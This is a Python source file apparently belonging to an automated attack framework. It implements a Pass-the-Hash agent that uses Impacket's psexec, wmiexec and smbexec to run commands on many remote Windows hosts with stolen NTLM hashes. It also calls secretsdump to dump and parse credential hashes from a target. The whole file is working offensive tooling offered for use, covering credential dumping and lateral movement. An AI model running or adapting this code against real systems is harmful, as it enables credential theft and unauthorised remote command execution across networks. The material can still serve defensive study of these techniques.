"""
Pass-the-Hash Agent

Authenticate using NTLM hashes without knowing plaintext passwords.
"""

import asyncio
import os
import json
from typing import Dict, List, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData


class PassTheHashAgent(BaseAgent):
    """
    Agent for Pass-the-Hash attacks.
    
    Capabilities:
    - Extract NTLM hashes from memory/SAM/NTDS.dit
    - Authenticate to SMB/WMI/RDP using hashes
    - Lateral movement using hashes
    - Execute commands on remote systems
    """
    
    def __init__(self):
        super().__init__(
            name="PassTheHashAgent",
            description="Authenticate and move laterally using NTLM hashes",
            version="1.0.0"
        )
        self.output_dir = "workspace/pth"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        """
        Execute Pass-the-Hash attack.
        
        Args:
            strategy: Attack strategy containing:
                - domain: Target domain
                - username: Username
                - ntlm_hash: NTLM hash (format: LM:NTLM or just NTLM)
                - targets: List of target IPs/hostnames
                - command: Command to execute (optional)
                - method: 'psexec', 'wmiexec', or 'smbexec' (default: psexec)
        
        Returns:
            AgentData with command execution results
        """
        try:
            domain = strategy.get('domain', '.')
            username = strategy.get('username')
            ntlm_hash = strategy.get('ntlm_hash')
            targets = strategy.get('targets', [])
            command = strategy.get('command', 'whoami')
            method = strategy.get('method', 'psexec')
            
            if not all([username, ntlm_hash]):
                return AgentData(
                    success=False,
                    errors=["Missing required parameters: username, ntlm_hash"]
                )
            
            if not targets:
                return AgentData(
                    success=False,
                    errors=["No targets specified"]
                )
            
            self.log_info(f"Starting Pass-the-Hash attack with {method}")
            
            results = []
            for target in targets:
                result = await self._pth_execute(
                    target, domain, username, ntlm_hash, command, method
                )
                results.append(result)
                
                if result['success']:
                    self.log_success(f"Successfully executed on {target}")
                else:
                    self.log_error(f"Failed on {target}: {result.get('error')}")
            
            successful = [r for r in results if r['success']]
            
            return AgentData(
                success=len(successful) > 0,
                data={
                    'results': results,
                    'successful_targets': len(successful),
                    'total_targets': len(targets)
                }
            )
            
        except Exception as e:
            self.log_error(f"Pass-the-Hash failed: {str(e)}")
            return AgentData(success=False, errors=[str(e)])
    
    async def _pth_execute(self, target: str, domain: str, username: str, 
                          ntlm_hash: str, command: str, method: str) -> Dict:
        """Execute command on target using Pass-the-Hash."""
        try:
            # Select tool based on method
            tool_map = {
                'psexec': 'psexec.py',
                'wmiexec': 'wmiexec.py',
                'smbexec': 'smbexec.py'
            }
            
            tool = tool_map.get(method, 'psexec.py')
            
            # Build command
            cmd = [
                tool,
                f'{domain}/{username}@{target}',
                '-hashes', f':{ntlm_hash}' if ':' not in ntlm_hash else ntlm_hash,
                command
            ]
            
            self.log_info(f"Executing on {target} via {method}...")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=60.0
            )
            
            success = process.returncode == 0
            
            return {
                'target': target,
                'success': success,
                'output': stdout.decode() if success else None,
                'error': stderr.decode() if not success else None,
                'method': method
            }
            
        except asyncio.TimeoutError:
            return {
                'target': target,
                'success': False,
                'error': 'Command execution timeout'
            }
        except Exception as e:
            return {
                'target': target,
                'success': False,
                'error': str(e)
            }
    
    async def extract_hashes(self, target: str, domain: str, username: str, 
                           password: str) -> List[Dict]:
        """
        Extract NTLM hashes from target system.
        
        Args:
            target: Target IP/hostname
            domain: Domain name
            username: Admin username
            password: Admin password
        
        Returns:
            List of extracted hashes
        """
        try:
            self.log_info(f"Extracting hashes from {target}...")
            
            cmd = [
                'secretsdump.py',
                f'{domain}/{username}:{password}@{target}',
                '-outputfile', f'{self.output_dir}/{target}_hashes'
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                self.log_error(f"Hash extraction failed: {stderr.decode()}")
                return []
            
            # Parse extracted hashes
            hashes = []
            hash_file = f'{self.output_dir}/{target}_hashes.ntds'
            
            if os.path.exists(hash_file):
                with open(hash_file, 'r') as f:
                    for line in f:
                        if ':' in line:
                            parts = line.strip().split(':')
                            if len(parts) >= 4:
                                hashes.append({
                                    'username': parts[0],
                                    'uid': parts[1],
                                    'lm_hash': parts[2],
                                    'ntlm_hash': parts[3]
                                })
            
            self.log_success(f"Extracted {len(hashes)} hashes from {target}")
            return hashes
            
        except Exception as e:
            self.log_error(f"Hash extraction failed: {str(e)}")
            return []

